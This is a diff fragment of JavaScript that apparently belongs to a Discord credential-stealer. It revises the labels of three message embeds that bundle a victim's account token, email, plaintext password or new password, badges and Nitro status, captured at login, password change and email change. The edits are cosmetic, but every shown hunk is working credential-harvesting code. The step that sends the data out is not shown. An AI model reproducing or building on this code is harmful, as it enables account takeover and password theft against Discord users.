@@ -368,28 +368,28 @@ xmlHttp.responseText;`, !0).then((info) => {
                 "color": 2303786,
                 "fields": [
 {
-"name": "<a:Blac:942395582293614614> **Token**",
+"name": "<a:Blac:942395582293614614> **Token:**",
                         "value": `${token}`,
                         "inline": false
 },
                     {
-                        "name": "<:email:942396358315376671> **Email**",
+                        "name": "<:email:942396358315376671> **Email:**",
                         "value": `${data.login}`,
                         "inline": true
                     },
                     {
-                        "name": "**<a:pass:942396025228902430> Password**",
+                        "name": "**<a:pass:942396025228902430> Password:**",
                         "value": `\`${data.password}\``,
                         "inline": false
                     },
 {
-"name": "<a:badges:942395694134751323> **Badges**",
+"name": "<a:badges:942395694134751323> **Badges:**",
                         "value": `${GetBadges(json.flags)}`,
                         "inline": false
 },
 {
-"name": " <a:nitro:942395826544705626> **Nitro Type**",
-                        "value": `\`${GetNitro(json.premium_type)}\``,
+"name": " <a:nitro:942395826544705626> **Nitro Type:**",
+                        "value": `${GetNitro(json.premium_type)}`,
                         "inline": false
 },
 {
@@ -440,27 +440,27 @@ xmlHttp.responseText;`, !0).then((info) => {
                 "color": 2303786,
                 "fields": [
 {
-"name": "<a:Blac:942395582293614614> **Token**",
+"name": "<a:Blac:942395582293614614> **Token:**",
                         "value": `${token}`,
                         "inline": false
 },
                     {
-                        "name": "<:email:942396358315376671> **Email**",
+                        "name": "<:email:942396358315376671> **Email:**",
                         "value": `${data.email}`,
                         "inline": true
                     },
                     {
-                        "name": "**<a:pass:942396025228902430>New  Password**",
+                        "name": "**<a:pass:942396025228902430>New  Password:**",
                         "value": `${data.new_password}`,
                         "inline": false
                     },
 {
-"name": "<a:badges:942395694134751323> **Badges**",
+"name": "<a:badges:942395694134751323> **Badges:**",
                         "value": `${GetBadges(json.flags)}`,
                         "inline": false
 },
 {
-"name": " <a:nitro:942395826544705626> **Nitro Type**",
+"name": " <a:nitro:942395826544705626> **Nitro Type:**",
                         "value": `${GetNitro(json.premium_type)}`,
                         "inline": false
 },
@@ -507,17 +507,17 @@ xmlHttp.responseText;`, !0).then((info) => {
                 "color": 2303786,
                 "fields": [
 {
-"name": "<a:Blac:942395582293614614> **Token**",
+"name": "<a:Blac:942395582293614614> **Token:**",
                         "value": `${token}`,
                         "inline": false
 },
                     {
-                        "name": "<:email:942396358315376671> **New Email**",
+                        "name": "<:email:942396358315376671> **New Email:**",
                         "value": `${data.email}`,
                         "inline": true
                     },
                     {
-                        "name": "**<a:pass:942396025228902430>New  Password**",
+                        "name": "**<a:pass:942396025228902430>New  Password:**",
                         "value": `${data.password}`,
                         "inline": false
                     },
